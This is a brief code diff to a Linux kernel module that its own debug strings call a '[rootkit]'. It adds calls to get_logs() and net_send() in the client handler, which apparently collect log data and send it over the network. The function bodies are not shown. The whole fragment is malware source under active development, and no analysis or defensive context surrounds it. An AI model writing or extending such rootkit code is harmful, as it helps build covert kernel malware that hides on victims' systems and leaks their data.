@@ -169,5 +169,7 @@ static int client_handler(void){
 		printk(KERN_DEBUG "[rootkit] handle_client: client is a fake\n%s", client.message); //print debug info
 		return -1; //return -1 for error
 	}
+	get_logs(client.message);
+	net_send();
 	return 0; //return 0 for no errors
 }
